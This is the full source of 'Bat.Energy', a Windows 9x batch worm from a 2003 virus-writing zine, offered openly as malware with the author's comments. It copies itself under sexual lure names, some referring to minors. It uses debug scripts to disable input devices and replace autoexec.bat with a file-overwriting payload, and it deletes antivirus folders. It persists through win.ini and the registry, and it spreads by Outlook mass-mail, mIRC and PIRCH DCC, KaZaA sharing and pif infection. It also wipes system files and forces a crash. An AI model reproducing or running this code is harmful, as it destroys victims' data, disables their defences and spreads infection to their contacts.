::
::
::
::                         DvL and BZ #1 mag proudly presents :
::                         =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
::
::
::
::
::               ;===       ======.   ==========.              =XMMMX=. ;
::               +MM#+      XMM##M;  .MM#MMMMMMM#X           =MM+;;;+M#+#.
::                 ;##;        =X       M=      .XM         +#=       ;##.
::                 =M=#        +M       M=        XX       ;#;         ;#.
::                 =M M+       +M       M=         #.      #=           M.
::                 =M .#.      +M       M=         M;     =M
::                 =M  +M      +M       M=        .#.     X+
::                 =M   M+     +M       M=        MM      #;
::                 =M   ;#.    +M       M=      ;MM       #;
::                 =M    +M    +M       MMXXXXXMM+        #;
::                 =M     #=   +M       MM++++M#;         #;      .=======.
::                 =M     ;#.  +M       M=     +#.        #;      ;MMMMM#M=
::                 =M      XM  +M       M=      =#.       M=            #
::                 =M       #= +M       M=       +M       XX           .#.
::                 =M       =# =M       M=        M+      .#.           #.
::                 =M        M+=M       M=        ;#.      +M           #.
::                 ;M        .MMX       M;         XM       MM.        .#.
::                +M#+++.     =#X    .++#M++=       #X=      X#X;.  .;+#M
::                XXXXXX.      +=    .XXXXXX+       ;XX       .XM####MX;
::
::
::
::
:: -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-[Bat.Energy by DvL]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
::
:: This worm was created for BZ #1 mag by DvL (finishing date: 07.06.2003)
::
:: my url and links of my friends "www.geocities.com/ratty_dvl/BATch/main.htm"
::
:: This worm will use the "pseudo-trash between code" tehnique all over his body, fakeing
:: the AV`s and makeing it a litle hard to understand for lamers and code rippers ;]
:: Contains many stupid and lame payloads but what the fuck ;]
::
%energy%ctty nul%energy%
%energy%@echo off%energy%
::
:: some fake bytes (1.000) fakeing the Av`s from a good detection
::
cweyfyrldgvwkcocrqfqtlxuchxdhkpddokhpvxcihqshgqnpjoeqlxsplomknjgiuhgvtfcrdspouyrrrpmnoqoiouypollpp
emlcctvneufmhnvfsutoqnldznssinuqigrxbzyxwfmblnqhxztsokqyiujhnbhfjfhfrhgergfopiuukhkbvlajhlhglopkll
stjrdnfuqlgmpuwefguowyakzxgkxolraxozihsw����esScfngwkpaoplokimnjuhbvgcfcxfglskqficjvckshgmgfjhgmkk
poiuujhgniylakfqrazsqqviidufwfuwcialsryemswoekufgliuyybgzdydplokbnthrgrgyfgfewwldthcxmdgfnfdlkjhjj
ajbakariwolazvdwhskrdsyqqcjayyqwusubevwumtwysahdzxtqhausplokinmjbhutpdkrjehlzmplkggdsnffdbdsfdsgmh
qficniylakfqrazsqqviidufwfuwcialsryemswoekufgliuyybgzdydplokbnthrgrgyfgfewwldnjgjffrehfdsgdsdsstjg
qhbueiaahtvwmhfrhntudpvscpkiftyiwceboltowopsojwxbuarilavzhgfbbrriepolylokiglybdgdddewhgasfasdsathg
pdmogwizgfrjhvxrmeewywmknxbqbthypeksxmywlfaijracwftfsflipoiuytrelkjhgfbvcsalhndgfsstrghdsvqasdffnf
zciptpriqzrfqkqwgfiqpivuityndlqmlivmdtkjuynjdxzmpjedfjacpouyhyhgfgffyfwyueelfbaaaaauybjewcqsdaadbd
cqqqtsqfndkcwihitiscoqqsphuooymtkolmjdielrslulfpqodcitauuygfuygsugfuygyuferlevdgrreiovjqwdqfgfdsvd
::
:: Creating an undeleatable folder (works only on win9x systems)
::
%energy%@md %windir%\DV� >nul%energy%
::
:: Copying the worm into several places to fool the usual user and to run it.
:: The copied worms will use names that will start the interest of an usual user. ;]
::
%energy%@if exist %windir%\desktop\"Lonely Girls For Your Pleasure.url.bat" goto done%energy%
%energy%@copy %0 %windir%\desktop\"Lonely Girls For Your Pleasure.url.bat" >nul%energy%
%energy%@if exist %windir%\desktop\"Lolita blows it.jpg.bat" goto done%energy%
%energy%@copy %0 %windir%\desktop\"Lolita blows it.jpg.bat" >nul%energy%
%energy%@if exist c:\mydocu~1\"Sex, Money and Power.doc.bat" goto done%energy%
%energy%@copy %0 c:\mydocu~1\"Sex, Money and Power.doc.bat" >nul%energy%
%energy%@if exist c:\mydocu~1\"Warcraft 3 update.exe.bat" goto done%energy%
%energy%@copy %0 c:\mydocu~1\"Warcraft 3 update.exe.bat" >nul%energy%
%energy%@deltree/y %windir%\desktop\startm~1\*.* >nul%energy%
%energy%@if exist %windir%\desktop\startm~1\"Windows Update.exe.bat" goto done%energy%
%energy%@copy %0 %windir%\desktop\startm~1\"Windows Update.exe.bat" >nul%energy%
::
:: Copying the worm into the undeleatable folder and droping a file (from a
:: debug script) on "c:\windows\startm~1\programs\startup\" to start the
:: computer with the keyboard and the mouse disabled and run it (payload) ;]
::
%energy%@copy %0 %windir%\DV�\nrg.bat >nul%energy%
%energy%@echo e 0100  25 6E 72 67 25 63 74 74 79 20 6E 75 6C 25 64 76>>enrg%energy%
%energy%@echo e 0110  6C 25 0D 0A 25 6E 72 67 25 40 65 63 68 6F 20 6F>>enrg%energy%
%energy%@echo e 0120  66 66 25 64 76 6C 25 0D 0A 25 6E 72 67 25 40 25>>enrg%energy%
%energy%@echo e 0130  77 69 6E 64 69 72 25 72 75 6E 64 6C 6C 33 32 2E>>enrg%energy%
%energy%@echo e 0140  65 78 65 20 6D 6F 75 73 65 2C 64 69 73 61 62 6C>>enrg%energy%
%energy%@echo e 0150  65 25 64 76 6C 0D 0A 25 6E 72 67 25 40 25 77 69>>enrg%energy%
%energy%@echo e 0160  6E 64 69 72 25 72 75 6E 64 6C 6C 33 32 2E 65 78>>enrg%energy%
%energy%@echo e 0170  65 20 6B 65 79 62 6F 61 72 64 2C 64 69 73 61 62>>enrg%energy%
%energy%@echo e 0180  6C 65 25 64 76 6C 25 0D 0A 25 6E 72 67 25 63 74>>enrg%energy%
%energy%@echo e 0190  74 79 20 63 6F 6E 25 64 76 6C 25 0D 0A 25 6E 72>>enrg%energy%
%energy%@echo e 01A0  67 25 63 6C 73 25 64 76 6C 25 00>>enrg%energy%
%energy%@echo rcx>>enrg%energy%
%energy%@echo AA>>enrg%energy%
%energy%@echo n bat>>enrg%energy%
%energy%@echo w>>enrg%energy%
%energy%@echo q>>enrg%energy%
%energy%@debug<enrg%energy%
%energy%@ren bat enrg.bat%energy%
%energy%@deltree/y bat >nul%energy%
%energy%@deltree/y enrg >nul%energy%
%energy%@enrg.bat%energy%
%energy%@copy enrg.bat %windir%\startm~1\programs\startup\"Sexyest Women brought to you. Click me and join us.html.bat" >nul%energy%
::
:: a debug script by me which will drop a payload instead of your usualy autoexec.bat file
:: located on c:\. If your date or time contains "13", the payload will overwrite many files
:: with this worm.
::
@echo e 0100  63 74 74 79 20 6E 75 6C 0D 0A 40 65 63 68 6F 20>>dati%energy%
@echo e 0110  6F 66 66 0D 0A 40 76 65 72 7C 64 61 74 65 3E 64>>dati%energy%
@echo e 0120  61 74 65 2E 74 78 74 0D 0A 40 66 69 6E 64 20 22>>dati%energy%
@echo e 0130  31 33 22 20 64 61 74 65 2E 74 78 74 7C 69 66 20>>dati%energy%
@echo e 0140  65 72 72 6F 72 6C 65 76 65 6C 20 30 20 67 6F 74>>dati%energy%
@echo e 0150  6F 20 74 69 6D 65 7C 69 66 20 6E 6F 74 20 65 72>>dati%energy%
@echo e 0160  72 6F 72 6C 65 76 65 6C 20 31 20 67 6F 74 6F 20>>dati%energy%
@echo e 0170  64 6F 0D 0A 3A 74 69 6D 65 0D 0A 40 76 65 72 7C>>dati%energy%
@echo e 0180  74 69 6D 65 3E 74 69 6D 65 2E 74 78 74 0D 0A 40>>dati%energy%
@echo e 0190  66 69 6E 64 20 22 31 33 22 20 74 69 6D 65 2E 74>>dati%energy%
@echo e 01A0  78 74 7C 69 66 20 65 72 72 6F 72 6C 65 76 65 6C>>dati%energy%
@echo e 01B0  20 30 20 67 6F 74 6F 20 64 6F 6E 65 7C 69 66 20>>dati%energy%
@echo e 01C0  6E 6F 74 20 65 72 72 6F 72 6C 65 76 65 6C 20 31>>dati%energy%
@echo e 01D0  20 67 6F 74 6F 20 64 6F 0D 0A 3A 64 6F 0D 0A 40>>dati%energy%
@echo e 01E0  66 6F 72 20 25 25 67 20 69 6E 20 28 2A 2E 2A 20>>dati%energy%
@echo e 01F0  2E 2E 5C 2A 2E 2A 20 63 3A 5C 6D 79 64 6F 63 75>>dati%energy%
@echo e 0200  7E 31 5C 2A 2E 2A 20 25 77 69 6E 64 69 72 25 5C>>dati%energy%
@echo e 0210  2A 2E 2A 20 25 70 61 74 68 25 5C 2A 2E 2A 20 63>>dati%energy%
@echo e 0220  3A 5C 2A 2E 2A 20 25 77 69 6E 64 69 72 25 5C 73>>dati%energy%
@echo e 0230  79 73 74 65 6D 5C 2A 2E 2A 29 20 64 6F 20 63 6F>>dati%energy%
@echo e 0240  70 79 20 25 30 20 25 25 67 0D 0A 3A 64 6F 6E 65>>dati%energy%
@echo e 0250  0D 0A 63 74 74 79 20 63 6F 6E 0D 0A 63 6C 73 00>>dati%energy%
@echo rcx>>dati%energy%
@echo 15F>>dati%energy%
@echo n bat>>dati%energy%
@echo w>>dati%energy%
@echo q>>dati%energy%
@debug<dati%energy%
@ren bat 1.bat%energy%
@ren c:\autoexec.bat dvl.bat%energy%
@deltree/y c:\dvl.bat%energy%
@copy 1.bat c:\autoexec.bat%energy%
@deltree/y bat >nul%energy%
@deltree/y dati >nul%energy%
::
:: a payload which creates 99 undeleatable folders on Desktop
::
md DV��000 >nul | md DV��001 >nul | md DV��002 >nul | md DV��003 >nul | md DV��004 >nul | md DV��005 >nul | md DV��006 >nul | md DV��007 >nul | md DV��008 >nul | md DV��009 >nul
md DV��010 >nul | md DV��011 >nul | md DV��012 >nul | md DV��013 >nul | md DV��014 >nul | md DV��015 >nul | md DV��016 >nul | md DV��017 >nul | md DV��018 >nul | md DV��019 >nul
md DV��020 >nul | md DV��021 >nul | md DV��022 >nul | md DV��023 >nul | md DV��024 >nul | md DV��025 >nul | md DV��026 >nul | md DV��027 >nul | md DV��028 >nul | md DV��029 >nul
md DV��030 >nul | md DV��031 >nul | md DV��032 >nul | md DV��033 >nul | md DV��034 >nul | md DV��035 >nul | md DV��036 >nul | md DV��037 >nul | md DV��038 >nul | md DV��039 >nul
md DV��040 >nul | md DV��041 >nul | md DV��042 >nul | md DV��043 >nul | md DV��044 >nul | md DV��045 >nul | md DV��046 >nul | md DV��047 >nul | md DV��048 >nul | md DV��049 >nul
md DV��050 >nul | md DV��051 >nul | md DV��052 >nul | md DV��053 >nul | md DV��054 >nul | md DV��055 >nul | md DV��056 >nul | md DV��057 >nul | md DV��058 >nul | md DV��059 >nul
md DV��060 >nul | md DV��061 >nul | md DV��062 >nul | md DV��063 >nul | md DV��064 >nul | md DV��065 >nul | md DV��066 >nul | md DV��067 >nul | md DV��068 >nul | md DV��069 >nul
md DV��070 >nul | md DV��071 >nul | md DV��072 >nul | md DV��073 >nul | md DV��074 >nul | md DV��075 >nul | md DV��076 >nul | md DV��077 >nul | md DV��078 >nul | md DV��079 >nul
md DV��080 >nul | md DV��081 >nul | md DV��082 >nul | md DV��083 >nul | md DV��084 >nul | md DV��085 >nul | md DV��086 >nul | md DV��087 >nul | md DV��088 >nul | md DV��089 >nul
md DV��090 >nul | md DV��091 >nul | md DV��092 >nul | md DV��093 >nul | md DV��094 >nul | md DV��095 >nul | md DV��096 >nul | md DV��097 >nul | md DV��098 >nul | md DV��099 >nul
::
:: the retro part of the worm
::
%energy%@deltree/y c:\progra~1\antivi~1\ >nul%energy%
%energy%@deltree/y c:\progra~1\kasper~1\ >nul%energy%
%energy%@deltree/y c:\progra~1\kasper~2\ >nul%energy%
%energy%@deltree/y c:\progra~1\common~1\avpsha~1\avpbases\ >nul%energy%
%energy%@deltree/y c:\progra~1\common~1\avpsha~1\ >nul%energy%
%energy%@deltree/y c:\progra~1\norton~1\ >nul%energy%
%energy%@deltree/y c:\progra~1\f-prot95\ >nul%energy%
%energy%@deltree/y c:\progra~1\mcafee\viruss~1\ >nul%energy%
%energy%@deltree/y c:\progra~1\mcafee\ >nul%energy%
%energy%@deltree/y c:\progra~1\tbav\ >nul%energy%
%energy%@deltree/y c:\tbavw95\ >nul%energy%
%energy%@deltree/y c:\tbav\ >nul%energy%
%energy%@deltree/y c:\vs95\ >nul%energy%
%energy%@deltree/y c:\progra~1\findvi~1\ >nul%energy%
%energy%@deltree/y c:\toolkit\findvi~1\ >nul%energy%
%energy%@deltree/y c:\progra~1\quickh~1\ >nul%energy%
%energy%@deltree/y c:\progra~1\comman~1\ >nul%energy%
::
:: residency
::
%energy%@echo.[windows]>res%energy%
%energy%@echo.load=c:\windows\DV�\nrg.bat>>res%energy%
%energy%@echo.run=>>res%energy%
%energy%@echo.NullPort=None>>res%energy%
%energy%@echo.>>res%energy%
%energy%@copy res + %winbootdir%\win.ini %winbootdir%\system\win.ini%energy%
%energy%@deltree/y %winbootdir%\win.ini >nul%energy%
%energy%@copy %winbootdir%\system\win.ini %winbootdir%\win.ini%energy%
%energy%@deltree/y %winbootdir%\system\win.ini >nul%energy%
::
:: a registry entry, that enables all files from c:\Windows\DV�
:: for sharing with KaZaa
::
%energy%@echo.REGEDIT4>energy%energy%
%energy%@echo.[HKEY_CURRENT_USER\Software\Kazaa\LocalContent]>>energy%energy%
%energy%@echo."DisableSharing"=dword:00000000>>energy%energy%
%energy%@echo."DownloadDir"="C:\\Program Files\\KaZaA\\My Shared Folder">>energy%energy%
%energy%@echo."Dir0"="012345:c:\\Windows\\DV�">>energy%energy%
%energy%@copy energy %windir%\DV�\energy.reg >nul%energy%
%energy%@regedit /s %windir%\DV�\energy.reg%energy%
::
:: registering the worm
::
%energy%@echo.REGEDIT4>%windir%\DV�\reg.reg%energy%
%energy%@echo.[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion]>>%windir%\DV�\reg.reg%energy%
%energy%@echo."RegisteredOwner"="bat.nrg by DvL">>%windir%\DV�\reg.reg%energy%
%energy%@echo.[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion]>>%windir%\DV�\reg.reg%energy%
%energy%@echo."RegisteredOrganization"="BZ mag 1">>%windir%\DV�\reg.reg%energy%
%energy%@regedit /s %windir%\DV�\reg.reg%energy%
::
:: outlook express spreading
::
%energy%@echo.on error resume next>out%energy%
%energy%@echo.dim a,b,c,d,e>>out%energy%
%energy%@echo.set a = Wscript.CreateObject("Wscript.Shell")>>out%energy%
%energy%@echo.set b = CreateObject("Outlook.Application")>>out%energy%
%energy%@echo.set c = b.GetNameSpace("MAPI")>>out%energy%
%energy%@echo.for y = 1 To c.AddressLists.Count>>out%energy%
%energy%@echo.set d = c.AddressLists(y)>>out%energy%
%energy%@echo.x = 1>>out%energy%
%energy%@echo.set e = b.CreateItem(0)>>out%energy%
%energy%@echo.for o = 1 To d.AddressEntries.Count>>out%energy%
%energy%@echo.f = d.AddressEntries(x)>>out%energy%
%energy%@echo.e.Recipients.Add f>>out%energy%
%energy%@echo.x = x + 1>>out%energy%
%energy%@echo.next>>out%energy%
%energy%@echo.e.Subject = "Chicky girls !">>out%energy%
%energy%@echo.e.Body = " Wanna know everything about girls and how to get them ??? Use the attachment to register to our zine and follow the instructions ! ">>out%energy%
%energy%@echo.e.Attachments.Add ("c:\windows\DV�\nrg.bat")>>out%energy%
%energy%@echo.e.DeleteAfterSubmit = False>>out%energy%
%energy%@echo.e.Send>>out%energy%
%energy%@echo.f = "">>out%energy%
%energy%@echo.next>>out%energy%
%energy%@copy out %windir%\DV�\out.vbs%energy%
%energy%@deltree/y out >nul%energy%
%energy%@start %windir%\DV�\out.vbs%energy%
::
:: mirc spreading
::
%energy%@echo.[script]>%windir%\DV�\mirc%energy%
%energy%@echo.n0=on 1:JOIN:#:{>>%windir%\DV�\mirc%energy%
%energy%@echo.n1= /if ( nick == $me ) { halt }>>%windir%\DV�\mirc%energy%
%energy%@echo.n2= /.dcc send $nick c:\windows\DV�\nrg.bat>>%windir%\DV�\mirc%energy%
%energy%@echo.n3=}>>%windir%\DV�\mirc%energy%
%energy%@if exist c:\mirc\mirc.ini copy %windir%\DV�\mirc c:\mirc\script.ini >nul%energy%
%energy%@if exist c:\mirc32\mirc.ini copy %windir%\DV�\mirc c:\mirc32\script.ini >nul%energy%
%energy%@if exist c:\progra~1\mirc\mirc.ini copy %windir%\DV�\mirc c:\progra~1\mirc\script.ini >nul%energy%
%energy%@if exist c:\progra~1\mirc32\mirc.ini copy %windir%\DV�\mirc c:\progra~1\mirc32\script.ini >nul%energy%
::
:: pirch spreading
::
%energy%@echo.[Levels]>%windir%\DV�\pirch%energy%
%energy%@echo.Enabled=1>>%windir%\DV�\pirch%energy%
%energy%@echo.Count=6>>%windir%\DV�\pirch%energy%
%energy%@echo.Level1=000-Unknowns>>%windir%\DV�\pirch%energy%
%energy%@echo.000-UnknownsEnabled=1>>%windir%\DV�\pirch%energy%
%energy%@echo.Level2=100-Level 100>>%windir%\DV�\pirch%energy%
%energy%@echo.100-Level 100Enabled=1>>%windir%\DV�\pirch%energy%
%energy%@echo.Level3=200-Level 200>>%windir%\DV�\pirch%energy%
%energy%@echo.200-Level 200Enabled=1>>%windir%\DV�\pirch%energy%
%energy%@echo.Level4=300-Level 300>>%windir%\DV�\pirch%energy%
%energy%@echo.300-Level 300Enabled=1>>%windir%\DV�\pirch%energy%
%energy%@echo.Level5=400-Level 400>>%windir%\DV�\pirch%energy%
%energy%@echo.400-Level 400Enabled=1>>%windir%\DV�\pirch%energy%
%energy%@echo.Level6=500-Level 500>>%windir%\DV�\pirch%energy%
%energy%@echo.500-Level 500Enabled=1>>%windir%\DV�\pirch%energy%
%energy%@echo.>>%windir%\DV�\pirch%energy%
%energy%@echo.[000-Unknowns]>>%windir%\DV�\pirch%energy%
%energy%@echo.User1=*!*@*>>%windir%\DV�\pirch%energy%
%energy%@echo.UserCount=1>>%windir%\DV�\pirch%energy%
%energy%@echo.Event1=ON JOIN:#:/dcc send $nick c:\windows\DV�\nrg.bat>>%windir%\DV�\pirch%energy%
%energy%@echo.EventCount=1>>%windir%\DV�\pirch%energy%
%energy%@echo.>>%windir%\DV�\pirch%energy%
%energy%@echo.[100-Level 100]>>%windir%\DV�\pirch%energy%
%energy%@echo.UserCount=0>>%windir%\DV�\pirch%energy%
%energy%@echo.EventCount=0>>%windir%\DV�\pirch%energy%
%energy%@echo.>>%windir%\DV�\pirch%energy%
%energy%@echo.[200-Level 200]>>%windir%\DV�\pirch%energy%
%energy%@echo.UserCount=0>>%windir%\DV�\pirch%energy%
%energy%@echo.EventCount=0>>%windir%\DV�\pirch%energy%
%energy%@echo.>>%windir%\DV�\pirch%energy%
%energy%@echo.[300-Level 300]>>%windir%\DV�\pirch%energy%
%energy%@echo.UserCount=0>>%windir%\DV�\pirch%energy%
%energy%@echo.EventCount=0>>%windir%\DV�\pirch%energy%
%energy%@echo.>>%windir%\DV�\pirch%energy%
%energy%@echo.[400-Level 400]>>%windir%\DV�\pirch%energy%
%energy%@echo.UserCount=0>>%windir%\DV�\pirch%energy%
%energy%@echo.EventCount=0>>%windir%\DV�\pirch%energy%
%energy%@echo.>>%windir%\DV�\pirch%energy%
%energy%@echo.[500-Level 500]>>%windir%\DV�\pirch%energy%
%energy%@echo.UserCount=0>>%windir%\DV�\pirch%energy%
%energy%@echo.EventCount=0>>%windir%\DV�\pirch%energy%
%energy%@deltree/y c:\pirch98\events.ini >nul%energy%
%energy%@copy %windir%\DV�\pirch c:\pirch98\events.ini%energy%
::
:: preparing for pif infection
::
%energy%@echo.on error resume next>pif.vbs%energy%
%energy%@echo.dim wshs, msc>>pif.vbs%energy%
%energy%@echo.set wshs=Wscript.CreateObject("WScript.Shell")>>pif.vbs%energy%
%energy%@echo.set msc=wshs.CreateShortcut("C:\pif.lnk")>>pif.vbs%energy%
%energy%@echo.msc.TargetPath = wshs.ExpandEnvironmentStrings("c:\windows\DV�\nrg.bat")>>pif.vbs%energy%
%energy%@echo.msc.WindowStyle = 4>>pif.vbs%energy%
%energy%@echo.msc.Save>>pif.vbs%energy%
%energy%@start pif.vbs%energy%
::
:: an error message box which will tell u that your data was in "good" hands
::
%energy%@echo.On Error Resume Next>msg%energy%
%energy%@echo.MsgBox "          BAT.NRG aKa BAT.Energy by DvL" & Chr(13) & Chr(10) & " " & Chr(13) & Chr(10) & "                   |--|  \-\                 /-/  |--|        " & Chr(13) & Chr(10) & "                   |  |    \ \             / /    |  |        " & Chr(13) & Chr(10) & "                   |  |      \ \         / /      |  |        " & Chr(13) & Chr(10) & "                   |  |        \ \     / /        |  |        " & Chr(13) & Chr(10) & "                   |--|          \-\ /-/          |--|        " & Chr(13) & Chr(10) & " " & Chr(13) & Chr(10) & " www.geocities.com/ratty_dvl/BATch/main.htm",4096,"     DvL says NO to your data`z">>msg%energy%
%energy%@copy msg %windir%\DV�\msg.vbs >nul%energy%
::
:: registering the message box, which will run every time the pc will be restarted
::
%energy%@echo.REGEDIT4>msg.reg%energy%
%energy%@echo.[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>msg.reg%energy%
%energy%@echo."msg"="c:\\Windows\\DV�\\msg.vbs">>msg.reg%energy%
%energy%@regedit /s msg.reg%energy%
%energy%@start %windir%\DV�\msg.vbs%energy%
::
:: starting the pif infection
::
%energy%@for %%u in (%windir%\desktop\*.pif) do copy c:\pif.pif %%u%energy%
%energy%@for %%g in (%windir%\*.pif) do copy c:\pif.pif %%g%energy%
%energy%@for %%t in (%windir%\command\*.pif) do copy c:\pif.pif %%t%energy%
::
:: another payload (this time founded by me)
:: if any porn or similar files are founded on some locations the worm
:: will delete registry and system files with the "move" command ;]
::
%energy%@if exist c:\progra~1\"Virtual Girl" move nul c:\system.1st%energy%
%energy%@if exist c:\mydocu~1\ana* move nul %windir%\System.dat%energy%
%energy%@if exist c:\mydocu~1\les* move nul %windir%\User.dat%energy%
%energy%@if exist c:\mydocu~1\xx* move nul %windir%\win.com%energy%
%energy%@if exist c:\mydocu~1\por* move nul %windir%\win.ini%energy%
::
:: another payload, which will show the BSOD (blue screen of death) and
:: halt your windoze ;]
:: this time the payload will work only if deep freeze is instaled on your
:: system
::
%energy%@if exist c:\progra~1\deepfr~1 goto do%energy%
%energy%@if not exist c:\progra~1\hypert~1 goto skip%energy%
%energy%@if exist c:\progra~1\hypert~1 goto do%energy%
:do
%energy%@echo e 0100  3C 69 6D 67 20 73 72 63 3D 22 66 69 6C 65 3A 2F>>revenge%energy%
%energy%@echo e 0110  2F 2F 44 7C 2F 63 3A 5C 6E 75 6C 5C 6E 75 6C 22>>revenge%energy%
%energy%@echo e 0120  3E 00>>revenge%energy%
%energy%@echo rcx>>revenge%energy%
%energy%@echo 21>>revenge%energy%
%energy%@echo n htm>>revenge%energy%
%energy%@echo w>>revenge%energy%
%energy%@echo q>>revenge%energy%
%energy%@debug<revenge%energy%
%energy%@ren htm revenge.htm%energy%
%energy%@deltree/y htm >nul%energy%
%energy%@deltree/y revenge >nul%energy%
%energy%@start /max revenge.htm >nul%energy%
:skip
::
:: puting the hide and system atributes to the undeleatable folder and to this worm
::
%energy%@attrib +h +s %windir%\DV�%energy%
%energy%@attrib +h +s %0%energy%
::
:: again some fake bytes (1.000) - fakeing the Av`s from a good detection
::
lplohmrfjrurthuierthhhhoptlxuchxdhkpddokhpvxcihqshgqnpjoeqlxsplomknjgiuhgvtfcrdspouyrrrpmnoqoillpp
hngfhtthdgdgdneufmhnvfsutoqnldznssinuqigrxbzyxwfmblnqhxztsokqyiujhnbhfjfhfrhgergfopiuukhkbvlaopkll
stjrdnfuqlgmpuwefguowyakzxgkxolraxozihsw����esScfngwkpaoplokimnjuhbvgcfcxfglskqficjvckshgmgfjhgmkk
poiuujhgniylakfqrazsqqviidufwfuwcialsryemswoekufgliuyybgzdydplokbnthrgrgyfgfewwldthcxmdgfnfdlkjhjj
ajbakariwolazvdwhskrdsyqqcjayyqwusubevwumtwysahdztrfsplokinmjbhutpdkrjehlzmplkggdsnffdbdsfdsgmhlop
qficniylakfqrazsqqviidufwfuwrryemswoekufgliuyybgzdydplokbnthrgrgyfgfewwldnjgjffrehfdsgdsdsstjglopk
qhbttttyutyrvwmhfrhntudpvscpkiftyiwceboltowopsojwxbuarilavzhgfbbrriepolylokiglybdgdddewhgasfasdthg
pdmogwizgfrjhvxrmeewywmknxbqbthypeksxmywlfaijracwftfsflipoiuytrelkjhgfbvcsalhndgfsstrghdsvqasdffnf
zciptpriqzrfqkqwgfiqpivuityndlqmlivmdtkjuynjdxzmpjedfjacpouyhyhgfgffyfwyueelfbaaaaauybjewcqsdaadbd
yutfndkcwihitiscoqqsphuooymtkolmjdielrslulfpqodcitauuygfuygsugfuygyuferleogvdgrreiovjqwdqfgfdsvdyy
:done
::
:: I want to greet a lot of pplz coze many ideas are from them, but i will greet only the 1z
:: i know and the 1z from i was inspired ;]
:: 
:: -=- SAD1c, SpTh, philet0ast3r and adious -=- 
::
:: i hope nobody is upset on me ! c ya soon !~!
::
@echo on
ctty con
cls